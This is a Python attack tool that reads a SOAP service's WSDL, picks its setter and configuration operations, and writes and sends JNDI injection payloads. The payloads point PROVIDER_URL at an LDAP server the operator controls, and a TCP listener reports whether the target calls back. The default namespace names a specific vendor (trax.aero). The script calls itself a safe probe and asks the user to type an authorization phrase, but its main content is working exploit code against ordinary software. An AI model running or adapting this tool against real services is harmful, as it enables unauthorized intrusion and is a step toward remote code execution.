#!/usr/bin/env python3
"""
wsdl_auto_exploit.py

Safe automation for WSDL reconnaissance + JNDI probe (LDAP callback probe).
- Dry-run by default (parses WSDL, enumerates ops, writes payload XML files named after service).
- Active probe only with --exploit and explicit confirmation phrase (default: "I HAVE AUTHORIZATION").
- Will optionally start a TCP listener on chosen IP:port and report if a connection occurs.
- Will check sudo ufw status (if available) to help you validate egress/ingress rules.

Requirements:
  pip install zeep requests lxml

Usage examples (dry-run only):
  python wsdl_auto_exploit.py --wsdl https://host/service?wsdl --outdir ./payloads

To perform active probes:
  python wsdl_auto_exploit.py --wsdl ... --outdir ./payloads --exploit --listener --listen-port 1389

CAUTION: Active probing must only be used with explicit authorization.
"""

import argparse
import os
import socket
import subprocess
import threading
import time
from http import client
from pathlib import Path
from typing import Dict, List

import requests
from zeep import Client, Settings
from zeep.plugins import HistoryPlugin
from zeep.transports import Transport

# ---- Config / Suspicious items to look for ----
SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
SUSPICIOUS_FIELD_KEYWORDS = [
    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
    "customwriter", "msgSource"
]

# ---- Utility functions ----
def get_local_ip() -> str:
    """Return the primary local IP address used to reach the internet (best-effort)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # connect to a public DNS IP, doesn't send packets
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def check_ufw_status() -> str:
    """Try to run 'sudo ufw status' to show firewall settings (requires sudo)."""
    try:
        p = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=10)
        return p.stdout.strip() if p.returncode == 0 else f"ufw returned code {p.returncode}: {p.stdout.strip()} {p.stderr.strip()}"
    except Exception as e:
        return f"ufw check failed: {e}"

def save_payload(filename: Path, xml: str):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(xml, encoding="utf-8")
    print(f"[+] Wrote payload: {filename}")

# ---- Zeep client loader with simple timeout handling ----
def load_wsdl(wsdl_url: str, timeout=15, verify=True):
    session = requests.Session()
    session.verify = verify
    transport = Transport(session=session, timeout=timeout)
    settings = Settings(strict=False, xml_huge_tree=True)
    history = HistoryPlugin()
    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
    return client, history

# ---- Recon & payload generation ----
def recon_wsdl(wsdl_url: str):
    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
    client, history = load_wsdl(wsdl_url)
    services = {}
    suspicious_fields = set()
    encoded_style = False

    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
    try:
        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
            encoded_style = True
    except Exception:
        raw = None

    for sname, serv in client.wsdl.services.items():
        services[sname] = {}
        for pname, port in serv.ports.items():
            ops = list(port.binding._operations.keys())
            services[sname][pname] = {
                "address": port.binding_options.get("address"),
                "binding": str(port.binding.name),
                "operations": ops
            }

    # attempt to discover suspicious element/field names via client.wsdl.types
    try:
        schema = client.wsdl.types
        # elements: try both .elements and generator/list forms
        elems = []
        if hasattr(schema, "elements"):
            try:
                if hasattr(schema.elements, "items"):
                    elems = [k for k, v in schema.elements.items()]
                else:
                    elems = list(schema.elements)
            except Exception:
                elems = []
        for e in elems:
            name = getattr(e, "localname", str(e)).lower() if hasattr(e, "localname") or isinstance(e, tuple) else str(e).lower()
            for kw in SUSPICIOUS_FIELD_KEYWORDS:
                if kw.lower() in name:
                    suspicious_fields.add(name)
    except Exception:
        # fallback: nothing
        pass

    return {
        "services": services,
        "suspicious_fields": sorted(suspicious_fields),
        "encoded_style": encoded_style
    }

def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, target_port: int, namespace="http://source.trax.aero"):
    """
    Build a safe JNDI probe SOAP XML targeting a set* or setJmsConfig-like operation.
    The payload uses PROVIDER_URL=ldap://{target_ip}:{target_port}/Exploit and includes some common fields.
    This is intentionally non-destructive (no serialized gadget payload).
    """
    root_tag = operation
    # Basic jmsConfig body (some fields may be ignored by server; this is a generic probe)
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{target_ip}:{target_port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

# ---- Active network functions ----
def start_tcp_listener(bind_ip: str, bind_port: int, timeout: int = 30):
    """
    Start a TCP listener on bind_ip:bind_port in a background thread.
    Return (thread, result_dict) where result_dict['conn'] updated on incoming connection.
    """
    result = {"conn": None, "peer": None, "accepted": False}

    def _listener():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, bind_port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["conn"] = conn
                    result["peer"] = addr
                    result["accepted"] = True
                    # try to read small amount then close
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)

    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return t, result

def send_soap_payload(url: str, xml: str, timeout=15, verify=True):
    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '""'
    }
    try:
        r = requests.post(url, data=xml.encode("utf-8"), headers=headers, timeout=timeout, verify=verify)
        return {"status_code": r.status_code, "text": r.text[:2000], "headers": dict(r.headers)}
    except Exception as e:
        return {"error": str(e)}

# ---- Main automation ----
def main():
    ap = argparse.ArgumentParser(description="Automate WSDL recon and safe JNDI probe (LDAP callback) creation/sending.")
    ap.add_argument("--wsdl", required=True, help="WSDL URL")
    ap.add_argument("--outdir", default="payloads", help="Directory to write payload XML files")
    ap.add_argument("--exploit", action="store_true", help="Enable active exploit/probe sending (requires interactive confirmation)")
    ap.add_argument("--listener", action="store_true", help="Start a TCP listener on specified --listen-port to detect callbacks")
    ap.add_argument("--listen-ip", default=None, help="IP to bind the listener to (defaults to auto-detected public/private IP)")
    ap.add_argument("--listen-port", type=int, default=1389, help="Port to listen on for callback (default 1389)")
    ap.add_argument("--timeout", type=int, default=30, help="Listener timeout seconds")
    ap.add_argument("--no-verify-tls", action="store_true", help="Do not verify TLS when sending SOAP requests")
    args = ap.parse_args()

    wsdl = args.wsdl
    outdir = Path(args.outdir)
    verify_tls = not args.no_verify_tls

    print(f"[+] Reconnaissance: parsing WSDL {wsdl}")
    recon = recon_wsdl(wsdl)
    services = recon["services"]
    print(f"[+] Found services: {list(services.keys())}")
    for sname, ports in services.items():
        for pname, pinfo in ports.items():
            print(f"  - Service: {sname} / Port: {pname}")
            print(f"    Address: {pinfo.get('address')}")
            print(f"    Operations: {pinfo.get('operations')}")

    if recon["suspicious_fields"]:
        print(f"[!] Suspicious fields discovered: {recon['suspicious_fields']}")
    if recon["encoded_style"]:
        print("[!] WSDL indicates encoded/RPC style usage (higher risk)")

    # Determine listener IP
    local_ip = args.listen_ip if args.listen_ip else get_local_ip()
    listen_port = args.listen_port
    print(f"[+] Default listener IP: {local_ip}, port: {listen_port}")

    # Generate probe payloads for each service/operation that looks like a setter/configurer
    outdir.mkdir(parents=True, exist_ok=True)
    generated = []
    for sname, ports in services.items():
        safe_sname = sname.replace(" ", "_").replace("/", "_")
        for pname, pinfo in ports.items():
            for op in pinfo.get("operations", []):
                # heuristics: target "set*" and "start/stop" or anything suspicious
                lower = op.lower()
                is_interesting = any(k in lower for k in SUSPICIOUS_OP_KEYWORDS) or "jms" in lower or "flatfile" in lower or "timer" in lower
                if not is_interesting:
                    continue
                xml = build_jndi_probe_xml(safe_sname, op, local_ip, listen_port)
                fname = outdir / f"{safe_sname}_{op}.xml"
                save_payload(fname, xml)
                generated.append((op, fname, pinfo.get("address")))

    if not generated:
        print("[+] No interesting operations found (no 'set*' / config operations). Exiting.")
        return

    print(f"[+] Generated {len(generated)} probe payload(s) in {outdir}")

    # If not exploit mode, stop here
    if not args.exploit:
        print("[+] Dry-run complete. Use --exploit to run active probes (requires confirmation).")
        return

    # Active mode: require explicit typed authorization phrase
    auth_phrase = "I HAVE AUTHORIZATION"
    print("\n*** ACTIVE MODE ENABLED ***")
    print("You must have explicit written authorization to run active probes.")
    resp = input(f"Type the authorization phrase exactly to proceed: [{auth_phrase}]\n> ").strip()
    if resp != auth_phrase:
        print("[!] Authorization phrase mismatch. Aborting active probes.")
        return

    # show ufw status (requires sudo)
    print("[*] Checking ufw status (may prompt for sudo)...")
    ufw = check_ufw_status()
    print("[*] ufw status / output:")
    print(ufw)

    # Start listener if requested
    listener_thread = None
    listener_result = None
    if args.listener:
        print(f"[+] Starting TCP listener on {local_ip}:{listen_port} for {args.timeout}s ...")
        t, res = start_tcp_listener(local_ip, listen_port, timeout=args.timeout)
        listener_thread = t
        listener_result = res
        time.sleep(0.5)  # give listener a moment to bind (if possible)

    # Send SOAP payloads and observe responses + listener
    final_report = []
    for op, fname, address in generated:
        xml = fname.read_text(encoding="utf-8")
        target_url = address if address else wsdl
        print(f"[+] Sending probe for op {op} -> {target_url} (payload {fname.name})")
        r = send_soap_payload(target_url, xml, verify=verify_tls)
        print("    Response:", r.get("status_code", r.get("error")), " - truncated body:")
        if "text" in r and r["text"]:
            print(r["text"][:500].replace("\n", " "))
        final_report.append({"op": op, "payload": str(fname), "target": target_url, "response": r})

    # Wait for listener to complete if used
    if listener_thread:
        print(f"[+] Waiting {args.timeout}s for listener to capture callbacks...")
        listener_thread.join(timeout=args.timeout + 1)
        if listener_result and listener_result.get("accepted"):
            print("[!] Listener accepted a connection! Peer:", listener_result.get("peer"))
            final_report.append({"listener": "accepted", "peer": listener_result.get("peer")})
        else:
            print("[+] No callback observed by listener (no connection). This may indicate egress filtering or inaccessible listener.")
            final_report.append({"listener": "no_connection"})

    # Print final summary
    print("\n=== Summary Report ===")
    for item in final_report:
        print(item)

    print("\nDone. Remember to remove any probe payloads and evidence if required by your engagement rules.")

if __name__ == "__main__":
    main()
